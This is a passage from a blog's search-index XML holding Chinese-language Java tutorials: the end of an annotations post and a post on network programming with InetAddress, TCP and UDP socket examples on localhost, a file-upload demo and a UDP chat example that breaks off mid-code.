class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotationClass&#123;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotationFiled&#123;</span><br><span class="line">    <span class="function">String <span class="title">columnName</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">type</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
            <tag> 注解反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java网络编程</title>
      <link href="/2022/01/31/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/01/31/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<center><h1>网络编程</h1></center><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li>计算机网络是通过传输介质、通信设施和网络通信协议，把分散在不同地点的计算机设备互连起来，实现资源共享和数据传输的系统。网络编程就就是编写程序使联网的两个(或多个)设备(例如计算机)之间进行数据传输。Java语言对网络编程提供了良好的支持，通过其提供的接口我们可以很方便地进行网络编程。</li></ul><h2 id="网络编程的目的"><a href="#网络编程的目的" class="headerlink" title="网络编程的目的"></a>网络编程的目的</h2><p>直接或间接地通过网络协议与其它计算机实现数据交换，进行通讯</p><h2 id="网络编程中有两个主要的问题"><a href="#网络编程中有两个主要的问题" class="headerlink" title="网络编程中有两个主要的问题"></a>网络编程中有两个主要的问题</h2><p>1、如何准确地定位网络上一台或多台主机；定位主机上的特定的应用</p><p> 2、找到主机后如何可靠高效地进行数据传输</p><h2 id="网络通信要素概述"><a href="#网络通信要素概述" class="headerlink" title="网络通信要素概述"></a>网络通信要素概述</h2><p>我们需要知道的是主机间通过网络进行通信是需要遵循<strong>网络通信协议</strong>，是通过<strong>IP地址</strong>准确定位主机，通过<strong>端口号</strong>准确定位主机上的应用。</p><p><code>IP地址和端口号</code></p><p><code>网络通信协议</code></p><h2 id="如何实现网络中的主机互相通信"><a href="#如何实现网络中的主机互相通信" class="headerlink" title="如何实现网络中的主机互相通信"></a>如何实现网络中的主机互相通信</h2><p>1、通信双方地址：<code>IP</code>和<code>端口号</code></p><p>2、一定的规则（即：网络通信协议。有两套参考模型）</p><p>  OSI参考模型：模型过于理想化，未能在因特网上进行广泛推广。</p><p><strong>TCP/IP参考模型(或TCP/IP协议)：事实上的国际标准。</strong></p><h2 id="网络通信协议-以TCP-IP模型为例"><a href="#网络通信协议-以TCP-IP模型为例" class="headerlink" title="网络通信协议(以TCP/IP模型为例)"></a>网络通信协议(以TCP/IP模型为例)</h2><p>TCP/IP，即Transmission Control Protocol/Internet Protocol的简写，中译名为传输控制协议/因特网互联协议，是Internet最基本的协议、Internet国际互联网络的基础。</p><p>七层模型图示</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201311237136.webp"></p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201311238042.webp"></p><p>七层模型传输数据过程：</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201311237060.webp"></p><h1 id="InetAddress类"><a href="#InetAddress类" class="headerlink" title="InetAddress类"></a>InetAddress类</h1><p>InetAddress 类提供了操作 IP 地址的各种方法。该类本身没有构造方法，而是通过调用相关静态方法获取实例。InetAddress 类中的常用方法如下表 所示。</p><table><thead><tr><th>方法名称</th><th>说明</th></tr></thead><tbody><tr><td>boolean equals(Object obj)</td><td>将此对象与指定对象比较</td></tr><tr><td>byte[] getAddress()</td><td>返回此 InetAddress 对象的原始 IP 地址</td></tr><tr><td>static InetAddress[] getAHByName(String host)</td><td>在给定主机名的情况下，根据系统上配置的名称，服务器返 回其 IP 地址所组成的数组</td></tr><tr><td>static InetAddress getByAddress(byte[] addr)</td><td>在给定原始 IP 地址的情况下，返回 InetAddress 对象</td></tr><tr><td>static InetAddress getByAddress(String host)</td><td>在给定主机名的情况下确定主机的 IP 地址</td></tr><tr><td>String getCanonicalHostName()</td><td>获取此 IP 地址的完全限定域名</td></tr><tr><td>String getHostAddress()</td><td>返回 IP 地址字符串（以文本表现形式）</td></tr><tr><td>String getHostName()</td><td>返回此 IP 地址的主机名</td></tr><tr><td>static InetAdderss getLocalHost()</td><td>返回本地主机</td></tr></tbody></table><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetIp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnknownHostException </span>&#123;</span><br><span class="line"></span><br><span class="line">        InetAddress byName = InetAddress.getByName(<span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">        InetAddress byName2 = InetAddress.getLocalHost();</span><br><span class="line">        System.out.println(byName2);</span><br><span class="line">        System.out.println(byName);</span><br><span class="line"></span><br><span class="line">        System.out.println(byName.getAddress()); <span class="comment">//获得字节数组</span></span><br><span class="line">        System.out.println(byName.getCanonicalHostName()); <span class="comment">// 规范名字</span></span><br><span class="line">        System.out.println(byName.getHostAddress()); <span class="comment">// ip</span></span><br><span class="line">        System.out.println(byName.getHostName()); <span class="comment">// 域名， 或者自己电脑的名字</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>端口表示计算机上的一个程序的进程</p><ul><li><p>不同的进程有不同的端口号， 用来区分不用的软件</p></li><li><p>被规定0~65535</p></li><li><p>TCP,UDP : 65535 * 2 tcp: 80, udp: 80，单个协议下端口号不能重复</p></li><li><p>端口分类</p><ul><li><p>共有端口 0~1023</p><ul><li>HTTP 80</li><li>HTTPS 443</li><li>FTP 21</li><li>Telent 23</li><li>shell 22</li></ul></li><li><p>程序注册端口 1024~49151， 分配给用户和程序</p><ul><li>To,act 8080</li><li>Mysql 3306</li><li>Oracle 1521</li></ul></li><li><p>动态、私有端口 49152~65535</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano //查看所有端口</span><br><span class="line">netstat -ano|findstr <span class="string">&quot;5900&quot;</span> // 查看特定端口号</span><br><span class="line">tasklist|findstr <span class="string">&quot;3306&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h1><p><code>协议俗称约定</code></p><p>网络通信协议: 速率、传输码率、代码结构、传输控制……</p><p>TCP/IP协议实际是上一种协议</p><ul><li>TCP ：用户传输协议</li><li>UDP ： 用户数据协议</li></ul><p>比较出名的协议</p><ul><li>TCP</li><li>IP</li></ul><p><code>TCP UDP对比</code></p><p>TCP可以比喻打电话 </p><ul><li>连接, 稳定</li><li><code>三次握手，四次挥手</code></li><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201311553310.gif"></li><li>s客户端、服务端</li><li>传输完成，释放连接， 效率低</li></ul><p>UDP可以比喻发短信</p><ul><li><p>不连接,  不稳定</p></li><li><p>客户端、服务端、没有明确的界限</p></li><li><p>不管有没有准备都可发送</p></li></ul><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><p>需要一个客户端和一个服务端</p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol><li>需要知道服务器的地址 IneAddress</li><li>创建套接字 Socket </li><li>发送消息</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TcpClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">7789</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取ip</span></span><br><span class="line">        InetAddress ip = InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建套接字</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(ip, port);</span><br><span class="line">        <span class="comment">//发送消息</span></span><br><span class="line">        OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">        outputStream.write(<span class="string">&quot;你好世界&quot;</span>.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放资源</span></span><br><span class="line">        outputStream.close();</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><ol><li>创建套接字创建IP地址 ServerSocket</li><li>监听套接字 accept()</li><li>读取数据 </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TcpServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建套接字</span></span><br><span class="line">        ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">7789</span>);</span><br><span class="line">        Socket accept = serverSocket.accept();</span><br><span class="line">        InputStream inputStream = accept.getInputStream();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用管道</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] buffer  = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ( (len=inputStream.read(buffer))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="comment">//        int len;</span></span><br><span class="line"><span class="comment">//        while ((len = inputStream.read(buffer)) != -1)&#123;</span></span><br><span class="line"><span class="comment">//            String s = new String(buffer, 0, len);</span></span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//释放资源</span></span><br><span class="line">        baos.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line">        serverSocket.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件上传案例"><a href="#文件上传案例" class="headerlink" title="文件上传案例"></a>文件上传案例</h2><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文件上传客户端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUpClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>), <span class="number">6789</span>);</span><br><span class="line"></span><br><span class="line">        OutputStream ops = socket.getOutputStream();</span><br><span class="line">        </span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;kk.jpg&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len=fileInputStream.read(buffer)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            ops.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket.shutdownOutput();    <span class="comment">// 通知服务器传输结束</span></span><br><span class="line"></span><br><span class="line">        InputStream outputStream = socket.getInputStream();</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] buffer2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len2;</span><br><span class="line">        <span class="keyword">while</span> ((len2=outputStream.read(buffer2)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(buffer2, <span class="number">0</span>, len2);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line">        outputStream.close();</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        ops.close();</span><br><span class="line">        socket.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文件上传服务端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUpServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6789</span>);</span><br><span class="line">        Socket accept = serverSocket.accept();</span><br><span class="line">        InputStream inputStream = accept.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建输入流对象存放资源</span></span><br><span class="line">        FileOutputStream stream = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;jj.jpg&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ( (len=inputStream.read(buffer)) != -<span class="number">1</span> )&#123;</span><br><span class="line">            stream.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        OutputStream outputStream = accept.getOutputStream();</span><br><span class="line">        outputStream.write(<span class="string">&quot;我已经接收到了&quot;</span>.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        outputStream.close();</span><br><span class="line">        stream.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line">        accept.close();</span><br><span class="line">        serverSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><p>不需要连接但是需要对方的地址</p><h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><ol><li>创建套接字 DatagramSocket</li><li>创建数据包 DatagramPacket</li><li>发送数据包 send</li><li>关闭套接字 close</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * udp 客户端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdpClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建连接</span></span><br><span class="line">        DatagramSocket datagramSocket = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line"></span><br><span class="line">        String msg = <span class="string">&quot;你好世界&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">7788</span>;</span><br><span class="line">        <span class="comment">// 创建数据包</span></span><br><span class="line">        DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(msg.getBytes(),</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                msg.getBytes().length,</span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),</span><br><span class="line">                port);</span><br><span class="line"></span><br><span class="line">        datagramSocket.send(datagramPacket);</span><br><span class="line"></span><br><span class="line">        datagramSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><ol><li>创建套接字 DatagramSocket</li><li>创建数据包 DatagramPacket</li><li>接收数据包 receive</li><li>关闭套接字 close</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * udp服务端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdpServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建套接字</span></span><br><span class="line">        DatagramSocket datagramSocket = <span class="keyword">new</span> DatagramSocket(<span class="number">7788</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">// 创建数据包</span></span><br><span class="line">        DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(buffer, <span class="number">0</span>, buffer.length);</span><br><span class="line"></span><br><span class="line">        datagramSocket.receive(datagramPacket);</span><br><span class="line"></span><br><span class="line">        System.out.println(datagramPacket.getPort());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(datagramPacket.getData()));</span><br><span class="line"></span><br><span class="line">        datagramSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="多线程聊天案例"><a href="#多线程聊天案例" class="headerlink" title="多线程聊天案例"></a>多线程聊天案例</h1><p>两个人都是发送发，可以是接收方</p><p>演示结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你好</span><br><span class="line"><span class="number">60274</span>----&gt;你也好                                                                     </span><br><span class="line">请问你是机器人吗</span><br><span class="line"><span class="number">60274</span>----&gt;你好，我不是机器人                              </span><br></pre></td></tr></table></figure><p>发送方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送方</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadSend</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    DatagramSocket ds = <span class="keyword">null</span>;</span><br><span class="line">    BufferedReader bufferStr = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> String toIp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadSend</span><span class="params">(DatagramSocket ds, BufferedReader bufferStr, <span class="keyword">int</span> port, String toIp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ds = ds;</span><br><span class="line">        <span class="keyword">this</span>.bufferStr = bufferStr;</span><br><span class="line">        <span class="keyword">this</span>.port = port;</span><br><span class="line">        <span class="keyword">this</span>.toIp = toIp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String sysStr = bufferStr.readLine();</span><br><span class="line">                DatagramPacket pack = <span class="keyword">new</span> DatagramPacket(sysStr.getBytes(),</span><br><span class="line">                        <span class="number">0</span>, sysStr.getBytes().length,</span><br><span class="line">                        <span class="keyword">new</span> InetSocketAddress(<span class="keyword">this</span>.toIp, <span class="keyword">this</span>.port));</span><br><span class="line">                <span class="keyword">if</span>(sysStr.equals(<span class="string">&quot;bye&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ds.send(pack);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ds.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 接收方</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SendReceive</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    DatagramSocket dg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SendReceive</span><span class="params">(DatagramSocket dg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dg = dg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(buffer, <span class="number">0</span>, buffer.length);</span><br><span class="line">                